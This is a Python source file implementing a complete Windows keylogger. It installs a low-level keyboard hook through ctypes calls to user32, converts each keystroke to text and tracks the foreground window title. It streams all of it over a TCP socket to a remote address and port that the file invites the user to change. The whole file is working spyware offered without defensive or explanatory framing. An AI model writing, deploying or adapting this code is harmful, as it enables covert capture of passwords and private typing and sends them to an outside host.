import sys
import socket
from ctypes import *
from ctypes import wintypes

user32 = windll.user32
lpKeyState = wintypes.BYTE * 256

IP_ADDR = "127.0.0.1" # change this line
PORT = 9001           # change this line

LRESULT = c_long
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_RETURN = 0x0D
WM_SHIFT = 0x10

HOOKPROC = CFUNCTYPE (
    LRESULT,
    wintypes.INT,
    wintypes.WPARAM,
    wintypes.LPARAM
)

GetWindowTextLengthA = user32.GetWindowTextLengthA
GetWindowTextLengthA.argtypes = (wintypes.HANDLE, )
GetWindowTextLengthA.restype = wintypes.INT

GetWindowTextA = user32.GetWindowTextA
GetWindowTextA.argtypes = (
    wintypes.HANDLE,
    wintypes.LPSTR,
    wintypes.INT
)
GetWindowTextA.restype = wintypes.INT

GetKeyState = user32.GetKeyState
GetKeyState.argtypes = (wintypes.INT, )
GetKeyState.restype = wintypes.SHORT

GetKeyboardState = user32.GetKeyboardState
GetKeyboardState.argtypes = (POINTER(lpKeyState), )
GetKeyboardState.restype = wintypes.BOOL

ToAscii = user32.ToAscii
ToAscii.argtypes = (
    wintypes.UINT,
    wintypes.UINT,
    POINTER(lpKeyState),
    wintypes.LPWORD,
    wintypes.UINT
)
ToAscii.restype = wintypes.INT

CallNextHookEx = user32.CallNextHookEx
CallNextHookEx.argtypes = (
    wintypes.HHOOK,
    wintypes.INT,
    wintypes.WPARAM,
    wintypes.LPARAM
)
CallNextHookEx.restype = LRESULT

SetWindowsHookExA = user32.SetWindowsHookExA
SetWindowsHookExA.argtypes = (
    wintypes.INT,
    HOOKPROC,
    wintypes.HINSTANCE,
    wintypes.DWORD,
)
SetWindowsHookExA.restype = wintypes.HHOOK

GetMessageA = user32.GetMessageA
GetMessageA.argtypes = (
    wintypes.LPMSG,
    wintypes.HWND,
    wintypes.UINT,
    wintypes.UINT
)
GetMessageA.restype = wintypes.BOOL


class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", wintypes.DWORD)
    ]


def get_fgproc():
    HWND = user32.GetForegroundWindow()
    length  = GetWindowTextLengthA(HWND)
    buf = create_string_buffer(length + 1)
    
    GetWindowTextA(HWND, buf, length + 1)

    return buf.value


def hook_func(nCode, wParam, lParam):
    global last
    
    if last != get_fgproc():
        last = get_fgproc()
        msg = "\n[!] Last foreground process -> {}\n".format(last.decode("latin-1"))
        s.send(msg.encode("latin-1"))
    
    if wParam == WM_KEYDOWN:
        keyboard = KBDLLHOOKSTRUCT.from_address(lParam)
        state = (wintypes.BYTE * 256)()

        GetKeyState(WM_SHIFT)
        GetKeyboardState(byref(state))
        
        buf = (c_ushort * 1)()
        n = ToAscii(
            keyboard.vkCode,
            keyboard.scanCode,
            state,
            buf,
            0
        )
        
        if n > 0:
            if keyboard.vkCode == WM_RETURN:
                s.send(b"\n")
            else:
                msg = "{}".format(
                    string_at(buf).decode("latin-1"))
                s.send(msg.encode("latin-1"))

    return CallNextHookEx(
        hook,
        nCode,
        wParam,
        lParam
    )

if __name__ == "__main__":
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP_ADDR, PORT))

        last = None

        callback = HOOKPROC(hook_func)

        hook = SetWindowsHookExA(
            WH_KEYBOARD_LL,
            callback,
            0, 0
        )

        GetMessageA(
            byref(wintypes.MSG()),
            0, 0, 0
        )
    except:
        sys.exit(1)
